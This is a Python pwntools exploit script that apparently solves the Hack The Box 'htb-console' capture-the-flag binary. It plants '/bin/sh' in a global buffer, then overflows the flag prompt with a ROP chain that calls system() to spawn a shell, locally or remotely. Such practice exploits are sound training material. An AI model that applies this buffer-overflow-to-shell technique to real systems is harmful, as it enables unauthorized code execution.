#!/usr/bin/env python3

from pwn import *

e = ELF("./htb-console_patched")
# libc = ELF('./libc.so.6')
rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main+0x30)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    r.sendlineafter(b'>>', b'date')
    r.sendlineafter(b'>>', b'hof')
    r.sendlineafter(b'Enter your name:', b'/./bin/sh')
    r.sendlineafter(b'>>', b'flag')

    hof_addr = 0x4040b0  # hof variable location
    pop_rdi = rop.rdi[0]
    ret = rop.find_gadget(['ret'])[0]
    call_system = 0x401381
    # We cannot jump to system_plt directly for stack alignment issue and the limited size of ROP chain.
    # Instead, we should jump to the `call system()` in the program which pushes extra 8 bytes to the stack, which helps us align the stack. 
    info(f'The "pop rdi; ret" is at {hex(pop_rdi)}')
    info(f'The "ret" is at {hex(ret)}')
    info(f'The call to system() is at {hex(call_system)}')
    payload = flat(
            b'\x90' * 24,
            pop_rdi,
            p64(hof_addr),
            p64(call_system),
            )

    r.sendlineafter(b'Enter flag:', payload)

    r.interactive()

if __name__ == "__main__":
    main()
